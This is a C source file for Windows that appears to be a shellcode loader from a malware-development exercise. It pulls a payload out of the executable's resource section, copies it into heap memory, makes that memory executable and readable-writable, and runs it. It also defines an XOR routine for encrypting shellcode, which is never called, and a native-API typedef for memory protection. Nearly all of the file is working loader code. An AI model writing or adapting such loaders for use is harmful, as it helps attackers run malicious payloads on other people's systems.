#include "resource.h"

/*  Encryption with every byte of the key */
VOID XorByInputKey(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN PBYTE bKey, IN SIZE_T sKeySize) {
	for (size_t i = 0, j = 0; i < sShellcodeSize; i++, j++) {
		if (j >= sKeySize) {
			j = 0;
		}
		pShellcode[i] = pShellcode[i] ^ bKey[j];
	}
}


/* Get Module from DLL*/
HMODULE getMod(LPCWSTR modName) {
	HMODULE hModule = NULL;
	INFO("Getting handle to %S", modName);
	hModule = GetModuleHandleW(modName);
	if (hModule == NULL) {
		WARN("Failed to get a handle to the module: 0x%lx", GetLastError());
		return NULL;
	}
	else {
		INFO("Got handle to module: [%S\n\t] [0x%p]\n", modName, hModule);
		return hModule;
	}
}
/* NtProtectVirtualMemory Native API Wrapper */
typedef NTSTATUS(NTAPI* wProtectVirtual)(
	_In_ HANDLE ProcessHandle,
	_Inout_ PVOID* BaseAddress,
	_Inout_ PSIZE_T RegionSize,
	_In_ ULONG NewProtect,
	_Out_ PULONG OldProtect
	);


/* Execute my payload */
typedef void (*ExecuteShellcode)();

int main() {

	/* [Payload Related Variables]*/
	HRSRC	hRsrc = NULL;
	HGLOBAL	hGlobal = NULL;
	PVOID	pPayloadAddress = NULL;
	SIZE_T sPayloadSize = NULL;

	/* [Location of Payload .rsrc] */
	hRsrc = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);

	if (hRsrc == NULL) {
		printf("[!] FindResourceW Failed: %d \n", GetLastError());
		return -1;
	}
	/* [ Get Handle of Resource data] */
	hGlobal = LoadResource(NULL, hRsrc);
	if (hGlobal == NULL) {
		printf("[!] LoadResource Failed: %d \n", GetLastError());
		return -1;
	}


	/* [Get address of our payload in .rsrc] */
	pPayloadAddress = LockResource(hGlobal);
	if (pPayloadAddress == NULL) {
		printf("[!] LockResource Failed: %d \n", GetLastError());
		return -1;
	}

	/* [ Get Size of our payload in .rsrc] */
	sPayloadSize = SizeofResource(NULL, hRsrc);
	if (sPayloadSize == NULL) {
		printf("[!] SizeofResource Failed: %d \n", GetLastError());
		return -1;
	}


	/* [Creating memory with payload size] */
	PVOID pTmpBuffer = HeapAlloc(GetProcessHeap(), 0, sPayloadSize);
	if (pTmpBuffer != NULL) {
		/* [Copying payload from resource section to new buffer] */

		memcpy(pTmpBuffer, pPayloadAddress, sPayloadSize);
		/* Execute resource */		
	}
	DWORD oldprotect;
	if (pTmpBuffer == NULL) {
		return -1;
	}
	else {
		if (!VirtualProtect(pTmpBuffer, sPayloadSize, PAGE_EXECUTE_READWRITE, &oldprotect)) {
			WARN("VirtualProtect Failed: %d", GetLastError());
		}
	}

	INFO("pPayloadAddress var: 0x%p", pPayloadAddress);
	INFO("sPayloadSize var: 0x%p", sPayloadSize);
	INFO("pTmpBuffer var: 0x%p", pTmpBuffer);



	/* Executing payload from .rsrc section of PE */
	ExecuteShellcode execShell = (ExecuteShellcode)pTmpBuffer;
	execShell();

	/* Freeing heap of my buffer */
	HeapFree(GetProcessHeap(), 0, pTmpBuffer);


	return 0; 

}
